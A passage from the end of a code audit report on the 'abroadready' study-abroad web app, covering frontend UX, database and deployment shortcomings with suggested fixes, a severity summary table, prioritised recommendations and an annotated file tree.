  showToast(err.message || "Failed", "error");
}

// User sees:
// - "Failed to fetch" (network error)
// - "Unauthorized" (401)
// - "Server error" (generic 500)
// 
// Not helpful! User doesn't know what to do.
```

**Fix:**
```javascript
const errors = {
  401: "Please log in again.",
  403: "You don't have permission for this action.",
  404: "The resource was not found.",
  422: "Please check your input.",
  500: "Server error. Try again later or contact support.",
};
showToast(errors[status] || err.message, "error");
```

---

### 6.4 No Form Validation

**Issue:**
```html
<!-- profile.html: No HTML5 validation, no JS validation -->
<input class="input" name="bachelors_gpa" type="number" step="0.01" min="0" max="100" />

<!-- If user enters:
  - "abc" → sends "NaN" or empty
  - "999" → sends 999 (over max)
  - "-50" → sends -50 (under min)
-->
```

**Fix:**
```javascript
const value = parseFloat(input.value);
if (!Number.isFinite(value)) return showToast("GPA must be a number", "error");
if (value < 0 || value > 100) return showToast("GPA must be 0-100", "error");
```

---

### 6.5 Hardcoded localhost:3000 in Email Links

**Severity:** CRITICAL FOR PRODUCTION  
**Files:** `lib/email.js` (lines 30, 36, 39, 45)  
**Issue:**
```javascript
const link = `http://localhost:${process.env.PORT || 3000}/auth/magic-link/verify?token=${...}`;
// If server is at abroadready.com:3000, magic links go to localhost!
// User clicks link → 404 or timeout
```

**Fix:**
```javascript
const baseUrl = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const link = `${baseUrl}/auth/magic-link/verify?token=${...}`;
```

---

### 6.6 No Responsive Design Checks

**Issue:**
```css
/* dashboard.html, profile.html use hard grids: */
<section class="grid cols-3">  <!-- 3 columns always -->
<!-- On mobile (375px), this stacks awkwardly -->
```

**Fix:**
```css
@media (max-width: 768px) {
  .grid.cols-3 { grid-template-columns: 1fr; }
}
```

---

### 6.7 Broken Navigation States

**Issue:**
```javascript
// global.js renders nav but doesn't highlight current page
// User on /universities sees nav with no active indicator
// User doesn't know where they are

// Back button doesn't work reliably
// Some pages load HTML, others load AJAX
// Mixed navigation model
```

---

## 7. DATABASE ISSUES

### 7.1 Missing Indexes

**Severity:** MEDIUM (will slow queries as data grows)  
**Issue:**
```sql
-- No indexes found on:
-- student_profiles: (user_id) - used in many queries
-- resumes: (user_id, analysis_status)
-- admit_predictions: (user_id, created_at)
-- community_posts: (user_id, country_code, university_slug)
-- crowdsourced_data_points: (course_id)
```

**Fix:**
```sql
CREATE INDEX idx_student_profiles_user_id ON student_profiles(user_id);
CREATE INDEX idx_resumes_user_id ON resumes(user_id);
CREATE INDEX idx_admit_predictions_user_id ON admit_predictions(user_id);
CREATE INDEX idx_community_posts_user_id ON community_posts(user_id);
CREATE INDEX idx_crowdsourced_course_id ON crowdsourced_data_points(course_id);
```

---

### 7.2 No Foreign Key Constraints (yet)

**Severity:** LOW (schema has FK declarations but `PRAGMA foreign_keys = ON`)  
**Issue:**
```sql
-- If someone deletes a user, their student_profiles, resumes, shortlists orphaned
-- No cascade delete configured
```

**Fix:**
```sql
CREATE TABLE resumes (
  user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
  ...
);
```

---

### 7.3 No Transactions for Multi-Step Operations

**Severity:** MEDIUM  
**Issue:**
```javascript
// In resume upload (routes/resumes.js):
const info = db.prepare("INSERT INTO resumes ...").run(...);
const resumeId = Number(info.lastInsertRowid);

// Then async:
analyzeResume(userId, resumeId, { localPath }).catch(() => null);

// If analyzeResume crashes after updating DB but before saving analysis:
// Resume record exists but analysis_status = 'pending' forever
// No rollback
```

**Fix:**
- Use transactions for related operations
- Or use queues (Bull, RabbitMQ) instead of fire-and-forget

---

## 8. DEPLOYMENT & OPERATIONS ISSUES

### 8.1 SQLite for Production

**Severity:** MEDIUM  
**Issue:**
- SQLite is single-process
- Can't scale horizontally
- File-based locking → slow concurrent writes
- No built-in backup/replication

**Fix for MVP:** SQLite is fine  
**Fix for scale (>1000 users):** Migrate to PostgreSQL

---

### 8.2 No Health Check Endpoint

**Issue:** No `/health` endpoint for load balancers/monitoring  
**Fix:**
```javascript
app.get('/health', (req, res) => {
  res.json({ ok: true, timestamp: new Date() });
});
```

---

### 8.3 No Graceful Shutdown

**Issue:**
```javascript
// server.js just listens, doesn't handle shutdown
app.listen(port, () => console.log(`Listening on ${port}`));

// If server is killed mid-request:
// Database connections orphaned
// Async operations abandoned
```

**Fix:**
```javascript
let isShuttingDown = false;
process.on('SIGTERM', async () => {
  isShuttingDown = true;
  console.log('Shutting down gracefully...');
  server.close(() => process.exit(0));
});
```

---

### 8.4 No Database Migration Tool

**Issue:**
```javascript
// Database schema changes are in db.js
// No version tracking: schema.sql v1? v2?
// If you need to rollback, no way to do it
```

**Fix:**
- Use migration tool: `db-migrate`, `Knex`, `Prisma`
- Track schema versions in DB

---

## 9. SUMMARY TABLE

| Category | Severity | Count | Status |
|----------|----------|-------|--------|
| Security | CRITICAL | 5 | 🔴 Fix immediately |
| Security | HIGH | 2 | 🔴 Fix soon |
| Security | MEDIUM | 3 | 🟡 Plan fixes |
| Data Integrity | HIGH | 1 | 🔴 Fix soon |
| Data Integrity | MEDIUM | 2 | 🟡 Plan fixes |
| Performance | MEDIUM | 3 | 🟡 Plan fixes |
| Code Quality | MEDIUM | 6 | 🟡 Plan refactor |
| Frontend UX | HIGH | 3 | 🟡 Plan improvements |
| Frontend UX | MEDIUM | 4 | 🟡 Plan improvements |
| Database | MEDIUM | 3 | 🟡 Plan migration |
| DevOps | MEDIUM | 4 | 🟡 Plan improvements |

---

## 10. RECOMMENDATIONS (PRIORITY ORDER)

### Immediate (Week 1)
1. ✅ **Rotate all API keys** - .env is exposed in repo
2. ✅ **Fix admin auth** - Check is_admin in database, not session
3. ✅ **Add CORS middleware** - Restrict origins
4. ✅ **Fix email links** - Use BASE_URL env variable
5. ✅ **Add XSS sanitization** - Use textContent or DOMPurify

### Short-term (Month 1)
1. ✅ **Add input validation** - Schema validation on all POST/PUT routes
2. ✅ **Implement rate limiting** - Prevent brute force & API abuse
3. ✅ **Email verification** - Send magic link on signup
4. ✅ **Add loading states** - Show spinner, disable buttons
5. ✅ **Add error handling** - User-friendly error messages
6. ✅ **Add database indexes** - Performance for >1000 users

### Medium-term (Quarter 1)
1. ✅ **Logging & monitoring** - Winston + Datadog/LogRocket
2. ✅ **Refactor scoring logic** - Consolidate duplicate code
3. ✅ **Implement missing features** - Email digest, moderation, sharing
4. ✅ **Frontend framework** - Migrate to React/Vue for maintenance
5. ✅ **TypeScript migration** - Type safety across codebase

### Long-term (Quarter 2+)
1. ✅ **PostgreSQL migration** - For horizontal scaling
2. ✅ **Caching layer** - Redis for session, DB queries
3. ✅ **Job queue** - Async task processing (resumes, predictions, emails)
4. ✅ **Real-time features** - WebSockets for notifications, live updates
5. ✅ **Mobile app** - Native iOS/Android or React Native

---

## APPENDIX: FILE STRUCTURE & PURPOSE

```
abroadready/
├── server.js                    # Express app, middleware, routes mounting
├── migrate.js                   # (Not analyzed - appears to be unused)
├── package.json                 # Dependencies, scripts
├── .env                         # ⚠️ EXPOSED CONFIG
├── database/
│   ├── db.js                    # SQLite singleton, migrations
│   ├── schema.sql               # 50+ table definitions
│   ├── setup.js                 # Initial seed (not analyzed)
│   ├── seed.js                  # Seed data (not analyzed)
│   ├── populate_universities.js # (Seed data - not analyzed)
│   └── abroadready.db           # SQLite file
├── lib/                         # Business logic & integrations
│   ├── middleware.js            # requireAuth, requireAdmin
│   ├── email.js                 # Nodemailer SMTP
│   ├── openai.js                # OpenAI API wrapper
│   ├── gemini.js                # Google Gemini wrapper
│   ├── huggingface.js           # HuggingFace API wrapper
│   ├── resumeAnalyzer.js        # Resume upload → analysis pipeline
│   ├── admitPredictor.js        # Admit prediction logic
│   ├── portfolioAnalyzer.js     # (Assumed - not in lib list, see routes/portfolio.js)
│   ├── scholarshipMatcher.js    # Scholarship matching logic
│   ├── financialAdvisor.js      # Loan ranking, budget planning
│   ├── cloudinary.js            # Cloudinary CDN upload
│   ├── firecrawl.js             # Web crawling for portfolios
│   ├── affinda.js               # Resume parsing API
│   ├── numbeo.js                # Cost of living API
│   ├── duckduckgo.js            # Search API
│   ├── tavily.js                # Research paper search (stub)
│   ├── openAlex.js              # Research data (stub)
│   ├── collegeScorecard.js      # US university data sync
│   ├── forex.js                 # Currency conversion
│   ├── cron.js                  # Background jobs
│   ├── github-storage.js        # (Not analyzed)
│   └── universities.js          # (Not analyzed)
├── routes/                      # Express route handlers
│   ├── auth.js                  # Register, login, logout, OAuth, magic links
│   ├── profile.js               # Profile get/update, scoring
│   ├── resumes.js               # Resume CRUD, upload
│   ├── portfolio.js             # Portfolio CRUD, crawl
│   ├── universities.js          # University search/filter
│   ├── courses.js               # Course search, crowdsource data
│   ├── predictions.js           # Admit predictions
│   ├── finance.js               # Lenders, calculators, budget plans
│   ├── scholarships.js          # Scholarship browse/match
│   ├── countries.js             # Country data
│   ├── community.js             # Forum posts/comments
│   ├── budget.js                # (Not analyzed - may be empty)
│   ├── loans.js                 # Loan tracker CRUD
│   ├── shortlist.js             # Kanban board save/load
│   ├── notifications.js         # Notification list
│   ├── admin.js                 # Admin sync/stats
│   ├── scholarshipsSync.js      # (Not analyzed - may be unused)
│   └── (portfolio.js - merged with routes/portfolio.js?)
├── public/
│   ├── css/                     # 22 CSS files
│   │   └── global.css, landing.css, login.css, dashboard.css, etc.
│   └── js/                      # 22 JavaScript files
│       ├── global.js            # Common utilities & nav
│       ├── landing.js
│       ├── login.js
│       ├── register.js
│       ├── onboarding.js
│       ├── dashboard.js
│       ├── profile.js
│       ├── resume.js
│       ├── portfolio.js
│       ├── universities.js
│       ├── university-detail.js
│       ├── courses.js
│       ├── course-detail.js
│       ├── predict.js
│       ├── shortlist.js
│       ├── finance.js
│       ├── scholarships.js
│       ├── countries.js
│       ├── country-detail.js
│       ├── earning.js
│       ├── community.js
│       ├── notifications.js
│       └── admin.js
├── views/                       # 21 HTML files (same names as js/)
├── uploads/                     # Local file storage (fallback to Cloudinary)
└── (uploads/ root dir)          # ⚠️ Files uploaded via form requests

```

---

**End of Report**
